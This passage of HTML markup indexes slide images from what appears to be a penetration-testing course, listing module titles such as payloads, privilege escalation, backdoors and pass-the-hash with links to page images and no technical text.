href=""><img src="images/1433-8.png" alt="images/1433-8.png" /></a><br /><br /><a href=""><img src="images/1433-9.png" alt="images/1433-9.png" /></a><br /><br /><a href=""><img src="images/1433-10.png" alt="images/1433-10.png" /></a><br /><br /><a href=""><img src="images/1433-11.png" alt="images/1433-11.png" /></a><br /><br /><a href=""><img src="images/1433-12.png" alt="images/1433-12.png" /></a><br /><br /><a href=""><img src="images/1433-13.png" alt="images/1433-13.png" /></a><br /><br /><a href=""><img src="images/1433-14.png" alt="images/1433-14.png" /></a><br /><br /><a href=""><img src="images/1433-15.png" alt="images/1433-15.png" /></a><br /><br /><a href=""><img src="images/1433-16.png" alt="images/1433-16.png" /></a><br /><br /><a href=""><img src="images/1433-17.png" alt="images/1433-17.png" /></a><br /><br /><a href=""><img src="images/1433-18.png" alt="images/1433-18.png" /></a><br /><br /><a href=""><img src="images/1433-19.png" alt="images/1433-19.png" /></a><br /><a href=""><img src="images/1433-20.png" alt="images/1433-20.png" /></a><a href=""><img src="images/1433-21.png" alt="images/1433-21.png" /></a><a href=""><img src="images/1433-22.png" alt="images/1433-22.png" /></a><a href=""><img src="images/1433-23.png" alt="images/1433-23.png" /></a><a href=""><img src="images/1433-24.png" alt="images/1433-24.png" /></a><a href=""><img src="images/1433-25.png" alt="images/1433-25.png" /></a><a href=""><img src="images/1433-26.png" alt="images/1433-26.png" /></a><a href=""><img src="images/1433-27.png" alt="images/1433-27.png" /></a><a href=""><img src="images/1433-28.png" alt="images/1433-28.png" /></a><a href=""><img src="images/1433-29.png" alt="images/1433-29.png" /></a><a href=""><img src="images/1433-30.png" alt="images/1433-30.png" /></a><a href=""><img src="images/1433-31.png" alt="images/1433-31.png" /></a><a href=""><img src="images/1433-32.png" alt="images/1433-32.png" /></a><a href=""><img src="images/1433-33.png" alt="images/1433-33.png" /></a><a href=""><img src="images/1433-34.png" alt="images/1433-34.png" /></a><a href=""><img src="images/1433-35.png" alt="images/1433-35.png" /></a><a href=""><img src="images/1433-36.png" alt="images/1433-36.png" /></a><a href=""><img src="images/1433-37.png" alt="images/1433-37.png" /></a></div><div class='page'><h1 class='title level-5'>02.0 Hacker Methodology  Tradecraft.pdf</h1><br/><a href=""><img src="images/1434-1.png" alt="images/1434-1.png" /></a><br /><br /><a href=""><img src="images/1434-2.png" alt="images/1434-2.png" /></a><br /><br /><a href=""><img src="images/1434-3.png" alt="images/1434-3.png" /></a><br /><br /><a href=""><img src="images/1434-4.png" alt="images/1434-4.png" /></a><br /><br /><a href=""><img src="images/1434-5.png" alt="images/1434-5.png" /></a><br /><br /><a href=""><img src="images/1434-6.png" alt="images/1434-6.png" /></a><br /><br /><a href=""><img src="images/1434-7.png" alt="images/1434-7.png" /></a><br /><br /><a href=""><img src="images/1434-8.png" alt="images/1434-8.png" /></a><br /><br /><a href=""><img src="images/1434-9.png" alt="images/1434-9.png" /></a><br /><br /><a href=""><img src="images/1434-10.png" alt="images/1434-10.png" /></a><br /><br /><a href=""><img src="images/1434-11.png" alt="images/1434-11.png" /></a><br /><a href=""><img src="images/1434-12.png" alt="images/1434-12.png" /></a><a href=""><img src="images/1434-13.png" alt="images/1434-13.png" /></a><a href=""><img src="images/1434-14.png" alt="images/1434-14.png" /></a><a href=""><img src="images/1434-15.png" alt="images/1434-15.png" /></a><a href=""><img src="images/1434-16.png" alt="images/1434-16.png" /></a><a href=""><img src="images/1434-17.png" alt="images/1434-17.png" /></a><a href=""><img src="images/1434-18.png" alt="images/1434-18.png" /></a><a href=""><img src="images/1434-19.png" alt="images/1434-19.png" /></a><a href=""><img src="images/1434-20.png" alt="images/1434-20.png" /></a><a href=""><img src="images/1434-21.png" alt="images/1434-21.png" /></a></div><div class='page'><h1 class='title level-5'>07.0 Payloads.pdf</h1><br/><a href=""><img src="images/1435-1.png" alt="images/1435-1.png" /></a><br /><br /><a href=""><img src="images/1435-2.png" alt="images/1435-2.png" /></a><br /><br /><a href=""><img src="images/1435-3.png" alt="images/1435-3.png" /></a><br /><br /><a href=""><img src="images/1435-4.png" alt="images/1435-4.png" /></a><br /><br /><a href=""><img src="images/1435-5.png" alt="images/1435-5.png" /></a><br /><br /><a href=""><img src="images/1435-6.png" alt="images/1435-6.png" /></a><br /><br /><a href=""><img src="images/1435-7.png" alt="images/1435-7.png" /></a><br /><br /><a href=""><img src="images/1435-8.png" alt="images/1435-8.png" /></a><br /><br /><a href=""><img src="images/1435-9.png" alt="images/1435-9.png" /></a><br /><br /><a href=""><img src="images/1435-10.png" alt="images/1435-10.png" /></a><br /><br /><a href=""><img src="images/1435-11.png" alt="images/1435-11.png" /></a><br /><br /><a href=""><img src="images/1435-12.png" alt="images/1435-12.png" /></a><br /><br /><a href=""><img src="images/1435-13.png" alt="images/1435-13.png" /></a><br /><br /><a href=""><img src="images/1435-14.png" alt="images/1435-14.png" /></a><br /><br /><a href=""><img src="images/1435-15.png" alt="images/1435-15.png" /></a><br /><br /><a href=""><img src="images/1435-16.png" alt="images/1435-16.png" /></a><br /><br /><a href=""><img src="images/1435-17.png" alt="images/1435-17.png" /></a><br /><br /><a href=""><img src="images/1435-18.png" alt="images/1435-18.png" /></a><br /><a href=""><img src="images/1435-19.png" alt="images/1435-19.png" /></a><a href=""><img src="images/1435-20.png" alt="images/1435-20.png" /></a><a href=""><img src="images/1435-21.png" alt="images/1435-21.png" /></a><a href=""><img src="images/1435-22.png" alt="images/1435-22.png" /></a><a href=""><img src="images/1435-23.png" alt="images/1435-23.png" /></a><a href=""><img src="images/1435-24.png" alt="images/1435-24.png" /></a><a href=""><img src="images/1435-25.png" alt="images/1435-25.png" /></a><a href=""><img src="images/1435-26.png" alt="images/1435-26.png" /></a><a href=""><img src="images/1435-27.png" alt="images/1435-27.png" /></a><a href=""><img src="images/1435-28.png" alt="images/1435-28.png" /></a><a href=""><img src="images/1435-29.png" alt="images/1435-29.png" /></a><a href=""><img src="images/1435-30.png" alt="images/1435-30.png" /></a><a href=""><img src="images/1435-31.png" alt="images/1435-31.png" /></a><a href=""><img src="images/1435-32.png" alt="images/1435-32.png" /></a><a href=""><img src="images/1435-33.png" alt="images/1435-33.png" /></a><a href=""><img src="images/1435-34.png" alt="images/1435-34.png" /></a><a href=""><img src="images/1435-35.png" alt="images/1435-35.png" /></a></div><div class='page'><h1 class='title level-5'>Research Vulnerabilities.pdf</h1><br/><a href=""><img src="images/1436-1.png" alt="images/1436-1.png" /></a><br /><br /><a href=""><img src="images/1436-2.png" alt="images/1436-2.png" /></a><br /><br /><a href=""><img src="images/1436-3.png" alt="images/1436-3.png" /></a><a href=""><img src="images/1436-4.png" alt="images/1436-4.png" /></a></div><div class='page'><h1 class='title level-5'>14.0 Windows Privilege Escalation.pdf</h1><br/><a href=""><img src="images/1437-1.png" alt="images/1437-1.png" /></a><br /><br /><a href=""><img src="images/1437-2.png" alt="images/1437-2.png" /></a><br /><br /><a href=""><img src="images/1437-3.png" alt="images/1437-3.png" /></a><br /><br /><a href=""><img src="images/1437-4.png" alt="images/1437-4.png" /></a><br /><br /><a href=""><img src="images/1437-5.png" alt="images/1437-5.png" /></a><br /><br /><a href=""><img src="images/1437-6.png" alt="images/1437-6.png" /></a><br /><br /><a href=""><img src="images/1437-7.png" alt="images/1437-7.png" /></a><br /><br /><a href=""><img src="images/1437-8.png" alt="images/1437-8.png" /></a><br /><br /><a href=""><img src="images/1437-9.png" alt="images/1437-9.png" /></a><br /><br /><a href=""><img src="images/1437-10.png" alt="images/1437-10.png" /></a><br /><br /><a href=""><img src="images/1437-11.png" alt="images/1437-11.png" /></a><br /><br /><a href=""><img src="images/1437-12.png" alt="images/1437-12.png" /></a><br /><br /><a href=""><img src="images/1437-13.png" alt="images/1437-13.png" /></a><a href=""><img src="images/1437-14.png" alt="images/1437-14.png" /></a><a href=""><img src="images/1437-15.png" alt="images/1437-15.png" /></a><a href=""><img src="images/1437-16.png" alt="images/1437-16.png" /></a><a href=""><img src="images/1437-17.png" alt="images/1437-17.png" /></a><a href=""><img src="images/1437-18.png" alt="images/1437-18.png" /></a><a href=""><img src="images/1437-19.png" alt="images/1437-19.png" /></a><a href=""><img src="images/1437-20.png" alt="images/1437-20.png" /></a><a href=""><img src="images/1437-21.png" alt="images/1437-21.png" /></a><a href=""><img src="images/1437-22.png" alt="images/1437-22.png" /></a><a href=""><img src="images/1437-23.png" alt="images/1437-23.png" /></a><a href=""><img src="images/1437-24.png" alt="images/1437-24.png" /></a></div><div class='page'><h1 class='title level-5'>10.0 Nix Privilege Escalation.pdf</h1><br/><a href=""><img src="images/1438-1.png" alt="images/1438-1.png" /></a><br /><br /><a href=""><img src="images/1438-2.png" alt="images/1438-2.png" /></a><br /><br /><a href=""><img src="images/1438-3.png" alt="images/1438-3.png" /></a><br /><br /><a href=""><img src="images/1438-4.png" alt="images/1438-4.png" /></a><br /><br /><a href=""><img src="images/1438-5.png" alt="images/1438-5.png" /></a><br /><br /><a href=""><img src="images/1438-6.png" alt="images/1438-6.png" /></a><br /><br /><a href=""><img src="images/1438-7.png" alt="images/1438-7.png" /></a><br /><br /><a href=""><img src="images/1438-8.png" alt="images/1438-8.png" /></a><br /><br /><a href=""><img src="images/1438-9.png" alt="images/1438-9.png" /></a><br /><br /><a href=""><img src="images/1438-10.png" alt="images/1438-10.png" /></a><br /><br /><a href=""><img src="images/1438-11.png" alt="images/1438-11.png" /></a><br /><br /><a href=""><img src="images/1438-12.png" alt="images/1438-12.png" /></a><br /><br /><a href=""><img src="images/1438-13.png" alt="images/1438-13.png" /></a><br /><br /><a href=""><img src="images/1438-14.png" alt="images/1438-14.png" /></a><br /><br /><a href=""><img src="images/1438-15.png" alt="images/1438-15.png" /></a><a href=""><img src="images/1438-16.png" alt="images/1438-16.png" /></a><a href=""><img src="images/1438-17.png" alt="images/1438-17.png" /></a><a href=""><img src="images/1438-18.png" alt="images/1438-18.png" /></a><a href=""><img src="images/1438-19.png" alt="images/1438-19.png" /></a><a href=""><img src="images/1438-20.png" alt="images/1438-20.png" /></a><a href=""><img src="images/1438-21.png" alt="images/1438-21.png" /></a><a href=""><img src="images/1438-22.png" alt="images/1438-22.png" /></a><a href=""><img src="images/1438-23.png" alt="images/1438-23.png" /></a><a href=""><img src="images/1438-24.png" alt="images/1438-24.png" /></a><a href=""><img src="images/1438-25.png" alt="images/1438-25.png" /></a><a href=""><img src="images/1438-26.png" alt="images/1438-26.png" /></a><a href=""><img src="images/1438-27.png" alt="images/1438-27.png" /></a><a href=""><img src="images/1438-28.png" alt="images/1438-28.png" /></a></div><div class='page'><h1 class='title level-5'>05.0 Windows CLI  PS Host Survey.pdf</h1><br/><a href=""><img src="images/1439-1.png" alt="images/1439-1.png" /></a><br /><br /><a href=""><img src="images/1439-2.png" alt="images/1439-2.png" /></a><br /><br /><a href=""><img src="images/1439-3.png" alt="images/1439-3.png" /></a><br /><br /><a href=""><img src="images/1439-4.png" alt="images/1439-4.png" /></a><br /><br /><a href=""><img src="images/1439-5.png" alt="images/1439-5.png" /></a><br /><br /><a href=""><img src="images/1439-6.png" alt="images/1439-6.png" /></a><br /><br /><a href=""><img src="images/1439-7.png" alt="images/1439-7.png" /></a><br /><br /><a href=""><img src="images/1439-8.png" alt="images/1439-8.png" /></a><br /><br /><a href=""><img src="images/1439-9.png" alt="images/1439-9.png" /></a><br /><br /><a href=""><img src="images/1439-10.png" alt="images/1439-10.png" /></a><br /><br /><a href=""><img src="images/1439-11.png" alt="images/1439-11.png" /></a><br /><br /><a href=""><img src="images/1439-12.png" alt="images/1439-12.png" /></a><br /><br /><a href=""><img src="images/1439-13.png" alt="images/1439-13.png" /></a><br /><br /><a href=""><img src="images/1439-14.png" alt="images/1439-14.png" /></a><br /><br /><a href=""><img src="images/1439-15.png" alt="images/1439-15.png" /></a><br /><br /><a href=""><img src="images/1439-16.png" alt="images/1439-16.png" /></a><br /><a href=""><img src="images/1439-17.png" alt="images/1439-17.png" /></a><a href=""><img src="images/1439-18.png" alt="images/1439-18.png" /></a><a href=""><img src="images/1439-19.png" alt="images/1439-19.png" /></a><a href=""><img src="images/1439-20.png" alt="images/1439-20.png" /></a><a href=""><img src="images/1439-21.png" alt="images/1439-21.png" /></a><a href=""><img src="images/1439-22.png" alt="images/1439-22.png" /></a><a href=""><img src="images/1439-23.png" alt="images/1439-23.png" /></a><a href=""><img src="images/1439-24.png" alt="images/1439-24.png" /></a><a href=""><img src="images/1439-25.png" alt="images/1439-25.png" /></a><a href=""><img src="images/1439-26.png" alt="images/1439-26.png" /></a><a href=""><img src="images/1439-27.png" alt="images/1439-27.png" /></a><a href=""><img src="images/1439-28.png" alt="images/1439-28.png" /></a><a href=""><img src="images/1439-29.png" alt="images/1439-29.png" /></a><a href=""><img src="images/1439-30.png" alt="images/1439-30.png" /></a><a href=""><img src="images/1439-31.png" alt="images/1439-31.png" /></a></div><div class='page'><h1 class='title level-5'>Wireshark Filter Guide.pdf</h1><br/><a href=""><img src="images/1440-1.png" alt="images/1440-1.png" /></a><br /></div><div class='page'><h1 class='title level-5'>Vi Cheat Sheet.pdf</h1><br/><a href=""><img src="images/1441-1.png" alt="images/1441-1.png" /></a><br /></div><div class='page'><h1 class='title level-5'>Windows Command Guide.pdf</h1><br/><a href=""><img src="images/1442-1.png" alt="images/1442-1.png" /></a><br /><br /><a href=""><img src="images/1442-2.png" alt="images/1442-2.png" /></a><br /><br /><a href=""><img src="images/1442-3.png" alt="images/1442-3.png" /></a><br /><br /><a href=""><img src="images/1442-4.png" alt="images/1442-4.png" /></a><br /><br /><a href=""><img src="images/1442-5.png" alt="images/1442-5.png" /></a><br /><br /><a href=""><img src="images/1442-6.png" alt="images/1442-6.png" /></a><br /><a href=""><img src="images/1442-7.png" alt="images/1442-7.png" /></a><a href=""><img src="images/1442-8.png" alt="images/1442-8.png" /></a><a href=""><img src="images/1442-9.png" alt="images/1442-9.png" /></a><a href=""><img src="images/1442-10.png" alt="images/1442-10.png" /></a><a href=""><img src="images/1442-11.png" alt="images/1442-11.png" /></a></div><div class='page'><h1 class='title level-5'>17.0 Exploit Selection.pdf</h1><br/><a href=""><img src="images/1443-1.png" alt="images/1443-1.png" /></a><br /><br /><a href=""><img src="images/1443-2.png" alt="images/1443-2.png" /></a><br /><br /><a href=""><img src="images/1443-3.png" alt="images/1443-3.png" /></a><br /><br /><a href=""><img src="images/1443-4.png" alt="images/1443-4.png" /></a><br /><br /><a href=""><img src="images/1443-5.png" alt="images/1443-5.png" /></a><br /><br /><a href=""><img src="images/1443-6.png" alt="images/1443-6.png" /></a><br /><br /><a href=""><img src="images/1443-7.png" alt="images/1443-7.png" /></a><br /><br /><a href=""><img src="images/1443-8.png" alt="images/1443-8.png" /></a><br /><br /><a href=""><img src="images/1443-9.png" alt="images/1443-9.png" /></a><br /><br /><a href=""><img src="images/1443-10.png" alt="images/1443-10.png" /></a><br /><a href=""><img src="images/1443-11.png" alt="images/1443-11.png" /></a><a href=""><img src="images/1443-12.png" alt="images/1443-12.png" /></a><a href=""><img src="images/1443-13.png" alt="images/1443-13.png" /></a><a href=""><img src="images/1443-14.png" alt="images/1443-14.png" /></a><a href=""><img src="images/1443-15.png" alt="images/1443-15.png" /></a><a href=""><img src="images/1443-16.png" alt="images/1443-16.png" /></a><a href=""><img src="images/1443-17.png" alt="images/1443-17.png" /></a><a href=""><img src="images/1443-18.png" alt="images/1443-18.png" /></a><a href=""><img src="images/1443-19.png" alt="images/1443-19.png" /></a></div><div class='page'><h1 class='title level-5'>01.0 Orientation  Course Overview.pdf</h1><br/><a href=""><img src="images/1444-1.png" alt="images/1444-1.png" /></a><br /><br /><a href=""><img src="images/1444-2.png" alt="images/1444-2.png" /></a><br /><br /><a href=""><img src="images/1444-3.png" alt="images/1444-3.png" /></a><br /><br /><a href=""><img src="images/1444-4.png" alt="images/1444-4.png" /></a><br /><br /><a href=""><img src="images/1444-5.png" alt="images/1444-5.png" /></a><br /><a href=""><img src="images/1444-6.png" alt="images/1444-6.png" /></a><a href=""><img src="images/1444-7.png" alt="images/1444-7.png" /></a><a href=""><img src="images/1444-8.png" alt="images/1444-8.png" /></a><a href=""><img src="images/1444-9.png" alt="images/1444-9.png" /></a></div><div class='page'><h1 class='title level-5'>Search Engines.pdf</h1><br/><a href=""><img src="images/1445-1.png" alt="images/1445-1.png" /></a><br /><br /><a href=""><img src="images/1445-2.png" alt="images/1445-2.png" /></a><br /><br /><a href=""><img src="images/1445-3.png" alt="images/1445-3.png" /></a><br /><br /><a href=""><img src="images/1445-4.png" alt="images/1445-4.png" /></a><br /><a href=""><img src="images/1445-5.png" alt="images/1445-5.png" /></a><a href=""><img src="images/1445-6.png" alt="images/1445-6.png" /></a><a href=""><img src="images/1445-7.png" alt="images/1445-7.png" /></a></div><div class='page'><h1 class='title level-5'>tshark Quick Guide.pdf</h1><br/><a href=""><img src="images/1446-1.png" alt="images/1446-1.png" /></a><br /></div><div class='page'><h1 class='title level-5'>06.0 Footprinting - Open Source Research.pdf</h1><br/><a href=""><img src="images/1447-1.png" alt="images/1447-1.png" /></a><br /><br /><a href=""><img src="images/1447-2.png" alt="images/1447-2.png" /></a><br /><br /><a href=""><img src="images/1447-3.png" alt="images/1447-3.png" /></a><br /><br /><a href=""><img src="images/1447-4.png" alt="images/1447-4.png" /></a><br /><br /><a href=""><img src="images/1447-5.png" alt="images/1447-5.png" /></a><br /><br /><a href=""><img src="images/1447-6.png" alt="images/1447-6.png" /></a><br /><br /><a href=""><img src="images/1447-7.png" alt="images/1447-7.png" /></a><br /><br /><a href=""><img src="images/1447-8.png" alt="images/1447-8.png" /></a><br /><br /><a href=""><img src="images/1447-9.png" alt="images/1447-9.png" /></a><br /><br /><a href=""><img src="images/1447-10.png" alt="images/1447-10.png" /></a><br /><br /><a href=""><img src="images/1447-11.png" alt="images/1447-11.png" /></a><br /><br /><a href=""><img src="images/1447-12.png" alt="images/1447-12.png" /></a><br /><br /><a href=""><img src="images/1447-13.png" alt="images/1447-13.png" /></a><br /><br /><a href=""><img src="images/1447-14.png" alt="images/1447-14.png" /></a><br /><a href=""><img src="images/1447-15.png" alt="images/1447-15.png" /></a><a href=""><img src="images/1447-16.png" alt="images/1447-16.png" /></a><a href=""><img src="images/1447-17.png" alt="images/1447-17.png" /></a><a href=""><img src="images/1447-18.png" alt="images/1447-18.png" /></a><a href=""><img src="images/1447-19.png" alt="images/1447-19.png" /></a><a href=""><img src="images/1447-20.png" alt="images/1447-20.png" /></a><a href=""><img src="images/1447-21.png" alt="images/1447-21.png" /></a><a href=""><img src="images/1447-22.png" alt="images/1447-22.png" /></a><a href=""><img src="images/1447-23.png" alt="images/1447-23.png" /></a><a href=""><img src="images/1447-24.png" alt="images/1447-24.png" /></a><a href=""><img src="images/1447-25.png" alt="images/1447-25.png" /></a><a href=""><img src="images/1447-26.png" alt="images/1447-26.png" /></a><a href=""><img src="images/1447-27.png" alt="images/1447-27.png" /></a></div><div class='page'><h1 class='title level-5'>18b Pass-the-Hash Lab.pdf</h1><br/><a href=""><img src="images/1448-1.png" alt="images/1448-1.png" /></a><br /><br /><a href=""><img src="images/1448-2.png" alt="images/1448-2.png" /></a><br /><br /><a href=""><img src="images/1448-3.png" alt="images/1448-3.png" /></a><a href=""><img src="images/1448-4.png" alt="images/1448-4.png" /></a></div><div class='page'><h1 class='title level-5'>09b Nix Web Exploitation Lab.pdf</h1><br/><a href=""><img src="images/1449-1.png" alt="images/1449-1.png" /></a><br /><br /><a href=""><img src="images/1449-2.png" alt="images/1449-2.png" /></a><br /><a href=""><img src="images/1449-3.png" alt="images/1449-3.png" /></a></div><div class='page'><h1 class='title level-5'>15.0 Windows Backdoors.pdf</h1><br/><a href=""><img src="images/1450-1.png" alt="images/1450-1.png" /></a><br /><br /><a href=""><img src="images/1450-2.png" alt="images/1450-2.png" /></a><br /><br /><a href=""><img src="images/1450-3.png" alt="images/1450-3.png" /></a><br /><br /><a href=""><img src="images/1450-4.png" alt="images/1450-4.png" /></a><br /><br /><a href=""><img src="images/1450-5.png" alt="images/1450-5.png" /></a><br /><br /><a href=""><img src="images/1450-6.png" alt="images/1450-6.png" /></a><br /><br /><a href=""><img src="images/1450-7.png" alt="images/1450-7.png" /></a><br /><br /><a href=""><img src="images/1450-8.png" alt="images/1450-8.png" /></a><br /><br /><a href=""><img src="images/1450-9.png" alt="images/1450-9.png" /></a><br /><br /><a href=""><img src="images/1450-10.png" alt="images/1450-10.png" /></a><br /><br /><a href=""><img src="images/1450-11.png" alt="images/1450-11.png" /></a><a href=""><img src="images/1450-12.png" alt="images/1450-12.png" /></a><a href=""><img src="images/1450-13.png" alt="images/1450-13.png" /></a><a href=""><img src="images/1450-14.png" alt="images/1450-14.png" /></a><a href=""><img src="images/1450-15.png" alt="images/1450-15.png" /></a><a href=""><img src="images/1450-16.png" alt="images/1450-16.png" /></a><a href=""><img src="images/1450-17.png" alt="images/1450-17.png" /></a><a href=""><img src="images/1450-18.png" alt="images/1450-18.png" /></a><a href=""><img src="images/1450-19.png" alt="images/1450-19.png" /></a><a href=""><img src="images/1450-20.png" alt="images/1450-20.png" /></a></div><div class='page'><h1 class='title level-5'>VMware Horizon Client.pdf</h1><br/><a href=""><img src="images/1451-1.png" alt="images/1451-1.png" /></a><br /><br /><a href=""><img src="images/1451-2.png" alt="images/1451-2.png" /></a><br /><br /><a href=""><img src="images/1451-3.png" alt="images/1451-3.png" /></a><br /><br /><a href=""><img src="images/1451-4.png" alt="images/1451-4.png" /></a><br /><br /><a href=""><img src="images/1451-5.png" alt="images/1451-5.png" /></a><br /><br /><a href=""><img src="images/1451-6.png" alt="images/1451-6.png" /></a><br /><br /><a href=""><img src="images/1451-7.png" alt="images/1451-7.png" /></a><br /><br /><a href=""><img src="images/1451-8.png" alt="images/1451-8.png" /></a><br /><br /><a href=""><img src="images/1451-9.png" alt="images/1451-9.png" /></a><br /><a href=""><img src="images/1451-10.png" alt="images/1451-10.png" /></a><a href=""><img src="images/1451-11.png" alt="images/1451-11.png" /></a><a href=""><img src="images/1451-12.png" alt="images/1451-12.png" /></a><a href=""><img src="images/1451-13.png" alt="images/1451-13.png" /></a><a href=""><img src="images/1451-14.png" alt="images/1451-14.png" /></a><a href=""><img src="images/1451-15.png" alt="images/1451-15.png" /></a><a href=""><img src="images/1451-16.png" alt="images/1451-16.png" /></a><a href=""><img src="images/1451-17.png" alt="images/1451-17.png" /></a></div><div class='page'><h1 class='title level-5'>08b External Scanning Lab.pdf</h1><br/><a href=""><img src="images/1452-1.png" alt="images/1452-1.png" /></a><br /><br /><a href=""><img src="images/1452-2.png" alt="images/1452-2.png" /></a><br /><a href=""><img src="images/1452-3.png" alt="images/1452-3.png" /></a></div><div class='page'><h1 class='title level-5'>11b Nix Backdoors Lab.pdf</h1><br/><a href=""><img src="images/1453-1.png" alt="images/1453-1.png" /></a><br /><br /><a href=""><img src="images/1453-2.png" alt="images/1453-2.png" /></a><br /><a href=""><img src="images/1453-3.png" alt="images/1453-3.png" /></a></div><div class='page'><h1 class='title level-5'>18.0 Pass the Hash.pdf</h1><br/><a href=""><img src="images/1454-1.png" alt="images/1454-1.png" /></a><br /><br /><a href=""><img src="images/1454-2.png" alt="images/1454-2.png" /></a><br /><br /><a href=""><img src="images/1454-3.png" alt="images/1454-3.png" /></a><br /><br /><a href=""><img src="images/1454-4.png" alt="images/1454-4.png" /></a><br /><br /><a href=""><img src="images/1454-5.png" alt="images/1454-5.png" /></a><br /><br /><a href=""><img src="images/1454-6.png" alt="images/1454-6.png" /></a><br /><br /><a href=""><img src="images/1454-7.png" alt="images/1454-7.png" /></a><br /><br /><a href=""><img src="images/1454-8.png" alt="images/1454-8.png" /></a><br /><br /><a href=""><img src="images/1454-9.png" alt="images/1454-9.png" /></a><a href=""><img src="images/1454-10.png" alt="images/1454-10.png" /></a><a href=""><img src="images/1454-11.png" alt="images/1454-11.png" /></a><a href=""><img src="images/1454-12.png" alt="images/1454-12.png" /></a><a href=""><img src="images/1454-13.png" alt="images/1454-13.png" /></a><a href=""><img src="images/1454-14.png" alt="images/1454-14.png" /></a><a href=""><img src="images/1454-15.png" alt="images/1454-15.png" /></a><a href=""><img src="images/1454-16.png" alt="images/1454-16.png" /></a></div><div class='page'><h1 class='title level-5'>07b Metasploit and Payloads Lab.pdf</h1><br/><a href=""><img src="images/1455-1.png" alt="images/1455-1.png" /></a><br /><br /><a href=""><img src="images/1455-2.png" alt="images/1455-2.png" /></a><br /><br /><a href=""><img src="images/1455-3.png" alt="images/1455-3.png" /></a><br /><br /><a href=""><img src="images/1455-4.png" alt="images/1455-4.png" /></a><br /><a href=""><img src="images/1455-5.png" alt="images/1455-5.png" /></a><a href=""><img src="images/1455-6.png" alt="images/1455-6.png" /></a><a href=""><img src="images/1455-7.png" alt="images/1455-7.png" /></a></div><div class='page'><h1 class='title level-5'>12.0 Nix SSH Masquerade.pdf</h1><br/><a href=""><img src="images/1456-1.png" alt="images/1456-1.png" /></a><br /><br /><a href=""><img src="images/1456-2.png" alt="images/1456-2.png" /></a><br /><br /><a href=""><img src="images/1456-3.png" alt="images/1456-3.png" /></a><br /><br /><a href=""><img src="images/1456-4.png" alt="images/1456-4.png" /></a><br /><br /><a href=""><img src="images/1456-5.png" alt="images/1456-5.png" /></a><br /><br /><a href=""><img src="images/1456-6.png" alt="images/1456-6.png" /></a><br /><br /><a href=""><img src="images/1456-7.png" alt="images/1456-7.png" /></a><br /><br /><a href=""><img src="images/1456-8.png" alt="images/1456-8.png" /></a><a href=""><img src="images/1456-9.png" alt="images/1456-9.png" /></a><a href=""><img src="images/1456-10.png" alt="images/1456-10.png" /></a><a href=""><img src="images/1456-11.png" alt="images/1456-11.png" /></a><a href=""><img src="images/1456-12.png" alt="images/1456-12.png" /></a><a href=""><img src="images/1456-13.png" alt="images/1456-13.png" /></a><a href=""><img src="images/1456-14.png" alt="images/1456-14.png" /></a></div><div class='page'><h1 class='title level-5'>16b Passive Network Enumeration Lab.pdf</h1><br/><a href=""><img src="images/1457-1.png" alt="images/1457-1.png" /></a><br /><br /><a href=""><img src="images/1457-2.png" alt="images/1457-2.png" /></a><br /><a href=""><img src="images/1457-3.png" alt="images/1457-3.png" /></a></div><div class='page'><h1 class='title level-5'>Linux Cheat Sheet.pdf</h1><br/><a href=""><img src="images/1458-1.png" alt="images/1458-1.png" /></a><br /><br /><a href=""><img src="images/1458-2.png" alt="images/1458-2.png" /></a></div><div class='page'><h1 class='title level-5'>19.0 Net Use.pdf</h1><br/><a href=""><img src="images/1459-1.png" alt="images/1459-1.png" /></a><br /><br /><a href=""><img src="images/1459-2.png" alt="images/1459-2.png" /></a><br /><br /><a href=""><img src="images/1459-3.png" alt="images/1459-3.png" /></a><br /><br /><a href=""><img src="images/1459-4.png" alt="images/1459-4.png" /></a><br /><br /><a href=""><img src="images/1459-5.png" alt="images/1459-5.png" /></a><br /><br /><a href=""><img src="images/1459-6.png" alt="images/1459-6.png" /></a><br /><br /><a href=""><img src="images/1459-7.png" alt="images/1459-7.png" /></a><br /><br /><a href=""><img src="images/1459-8.png" alt="images/1459-8.png" /></a><br /><br /><a href=""><img src="images/1459-9.png" alt="images/1459-9.png" /></a><br /><br /><a href=""><img src="images/1459-10.png" alt="images/1459-10.png" /></a><br /><br /><a href=""><img src="images/1459-11.png" alt="images/1459-11.png" /></a><br /><br /><a href=""><img src="images/1459-12.png" alt="images/1459-12.png" /></a><a href=""><img src="images/1459-13.png" alt="images/1459-13.png" /></a><a href=""><img src="images/1459-14.png" alt="images/1459-14.png" /></a><a href=""><img src="images/1459-15.png" alt="images/1459-15.png" /></a><a href=""><img src="images/1459-16.png" alt="images/1459-16.png" /></a><a href=""><img src="images/1459-17.png" alt="images/1459-17.png" /></a><a href=""><img src="images/1459-18.png" alt="images/1459-18.png" /></a><a href=""><img src="images/1459-19.png" alt="images/1459-19.png" /></a><a href=""><img src="images/1459-20.png" alt="images/1459-20.png" /></a><a href=""><img src="images/1459-21.png" alt="images/1459-21.png" /></a><a href=""><img src="images/1459-22.png" alt="images/1459-22.png" /></a></div><div class='page'><h1 class='title level-5'>13.0 Client-side Exploitation.pdf</h1><br/><a href=""><img src="images/1460-1.png" alt="images/1460-1.png" /></a><br /><br /><a href=""><img src="images/1460-2.png" alt="images/1460-2.png" /></a><br /><br /><a href=""><img src="images/1460-3.png" alt="images/1460-3.png" /></a><br /><br /><a href=""><img src="images/1460-4.png" alt="images/1460-4.png" /></a><br /><br /><a href=""><img src="images/1460-5.png" alt="images/1460-5.png" /></a><br /><br /><a href=""><img src="images/1460-6.png" alt="images/1460-6.png" /></a><br /><br /><a href=""><img src="images/1460-7.png" alt="images/1460-7.png" /></a><br /><br /><a href=""><img src="images/1460-8.png" alt="images/1460-8.png" /></a><br /><br /><a href=""><img src="images/1460-9.png" alt="images/1460-9.png" /></a><br /><br /><a href=""><img src="images/1460-10.png" alt="images/1460-10.png" /></a><br /><br /><a href=""><img src="images/1460-11.png" alt="images/1460-11.png" /></a><br /><br /><a href=""><img src="images/1460-12.png" alt="images/1460-12.png" /></a><br /><a href=""><img src="images/1460-13.png" alt="images/1460-13.png" /></a><a href=""><img src="images/1460-14.png" alt="images/1460-14.png" /></a><a href=""><img src="images/1460-15.png" alt="images/1460-15.png" /></a><a href=""><img src="images/1460-16.png" alt="images/1460-16.png" /></a><a href=""><img src="images/1460-17.png" alt="images/1460-17.png" /></a><a href=""><img src="images/1460-18.png" alt="images/1460-18.png" /></a><a href=""><img src="images/1460-19.png" alt="images/1460-19.png" /></a><a href=""><img src="images/1460-20.png" alt="images/1460-20.png" /></a><a href=""><img src="images/1460-21.png" alt="images/1460-21.png" /></a><a href=""><img src="images/1460-22.png" alt="images/1460-22.png" /></a><a href=""><img src="images/1460-23.png" 